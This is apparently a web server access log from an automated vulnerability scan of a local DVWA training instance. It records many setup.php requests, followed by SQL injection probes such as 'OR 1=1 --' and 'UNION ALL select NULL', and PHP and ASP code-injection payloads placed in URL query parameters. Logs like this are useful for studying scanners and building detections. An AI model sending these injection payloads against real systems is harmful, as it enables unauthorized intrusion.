172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=%27 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%27 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=%22 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%22 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=%3B HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%3B HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=%29 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%29 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query+AND+1%3D1+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query+AND+1%3D2+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query+OR+1%3D1+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query+AND+1%3D2+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query+OR+1%3D1+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 404 466 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /sitemap.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:32 +0000] "GET /docs/DVWA_v1.3.pdf?query=%29 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:32 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%29 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query+AND+1%3D1+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query+AND+1%3D2+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query+OR+1%3D1+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query+AND+1%3D2+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query+OR+1%3D1+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:33 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs/DVWA_v1.3.pdf HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /about.php?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 9062 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /about.php?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /about.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /about.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /about.php?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /about.php?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /about.php?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /about.php?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 301 826 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs/DVWA_v1.3.pdf?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 301 826 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 301 808 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 301 814 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 301 796 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 301 642 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 301 616 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 301 612 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs/DVWA_v1.3.pdf?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:34 +0000] "GET /docs/DVWA_v1.3.pdf?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
